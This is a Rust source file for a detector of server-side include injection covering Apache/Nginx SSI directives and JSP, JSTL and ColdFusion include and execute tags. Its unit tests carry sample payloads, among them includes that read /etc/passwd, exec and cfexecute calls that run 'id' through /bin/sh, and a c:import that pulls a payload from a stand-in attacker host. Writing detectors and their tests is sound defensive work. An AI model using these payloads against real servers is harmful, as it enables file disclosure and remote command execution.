use memchr::memchr_iter;

#[derive(Debug, Clone, Default)]
pub struct SsiInjectionDfaBuilder;
#[derive(Debug, Clone)]
pub struct SsiInjectionDfa;

impl SsiInjectionDfaBuilder {
    pub fn new() -> Self {
        Self
    }
    pub fn build(self) -> SsiInjectionDfa {
        SsiInjectionDfa
    }
}

const SSI_KEYWORDS: [(&[u8], &str); 12] = [
    (b"include", "include"),
    (b"exec", "exec"),
    (b"echo", "echo"),
    (b"config", "config"),
    (b"fsize", "fsize"),
    (b"flastmod", "flastmod"),
    (b"printenv", "printenv"),
    (b"set", "set"),
    (b"if", "if"),
    (b"elif", "elif"),
    (b"else", "else"),
    (b"endif", "endif"),
];

/// JSP / JSTL / ColdFusion server-side include/forward/execute tags.
const JSP_PATTERNS: [(&[u8], &str); 5] = [
    (b"<jsp:include",  "<jsp:include"),
    (b"<jsp:forward",  "<jsp:forward"),
    (b"<c:import",     "<c:import"),
    (b"<cfinclude",    "<cfinclude"),
    (b"<cfexecute",    "<cfexecute"),
];

fn starts_with_ci(hay: &[u8], pat: &[u8]) -> bool {
    hay.len() >= pat.len()
        && hay
            .iter()
            .take(pat.len())
            .zip(pat.iter())
            .all(|(a, b)| a.to_ascii_lowercase() == *b)
}

fn skip_ascii_ws(bytes: &[u8], mut idx: usize) -> usize {
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }
    idx
}

impl SsiInjectionDfa {
    pub fn detect(&self, input: &str) -> Option<String> {
        let bytes = input.as_bytes();

        // ── Apache / Nginx `<!--#` style ─────────────────────────────────────
        for idx in memchr_iter(b'<', bytes) {
            if bytes.len() < idx + 4 || &bytes[idx..idx + 4] != b"<!--" {
                continue;
            }

            let mut directive_idx = skip_ascii_ws(bytes, idx + 4);
            if directive_idx >= bytes.len() || bytes[directive_idx] != b'#' {
                continue;
            }
            directive_idx = skip_ascii_ws(bytes, directive_idx + 1);

            if !bytes[directive_idx..].windows(3).any(|w| w == b"-->") {
                continue;
            }
            let after = &bytes[directive_idx..];
            for (kw, label) in SSI_KEYWORDS {
                if starts_with_ci(after, kw) {
                    return Some(format!("<!--#{}", label));
                }
            }
        }

        // ── JSP / JSTL / ColdFusion include/forward/execute tags ─────────────
        for idx in memchr_iter(b'<', bytes) {
            for (pat, label) in JSP_PATTERNS {
                if bytes.len() >= idx + pat.len()
                    && bytes[idx..idx + pat.len()]
                        .iter()
                        .zip(pat.iter())
                        .all(|(a, b)| a.to_ascii_lowercase() == *b)
                {
                    return Some(label.to_string());
                }
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::SsiInjectionDfaBuilder;

    #[test]
    fn detects_ssi_directives_with_spacing_and_case_variants() {
        let dfa = SsiInjectionDfaBuilder::new().build();

        assert_eq!(
            dfa.detect("<!--#include file=\"/etc/passwd\" -->")
                .as_deref(),
            Some("<!--#include")
        );
        assert_eq!(
            dfa.detect("<!-- #exec cmd=\"id\" -->").as_deref(),
            Some("<!--#exec")
        );
        assert_eq!(
            dfa.detect("<!--# set var=\"x\" value=\"owned\" -->")
                .as_deref(),
            Some("<!--#set")
        );
        assert_eq!(
            dfa.detect("<!--#PRINTENV -->").as_deref(),
            Some("<!--#printenv")
        );
    }

    #[test]
    fn detects_jsp_jstl_coldfusion_include_patterns() {
        let dfa = SsiInjectionDfaBuilder::new().build();

        assert_eq!(
            dfa.detect("<jsp:include page=\"/admin/config\" />")
                .as_deref(),
            Some("<jsp:include")
        );
        assert_eq!(
            dfa.detect("<jsp:forward page=\"/internal\" />").as_deref(),
            Some("<jsp:forward")
        );
        assert_eq!(
            dfa.detect("<c:import url=\"http://attacker.test/payload\" />")
                .as_deref(),
            Some("<c:import")
        );
        assert_eq!(
            dfa.detect("<cfinclude template=\"/etc/passwd\" />")
                .as_deref(),
            Some("<cfinclude")
        );
        assert_eq!(
            dfa.detect("<cfexecute name=\"/bin/sh\" arguments=\"-c id\" />")
                .as_deref(),
            Some("<cfexecute")
        );
    }
}
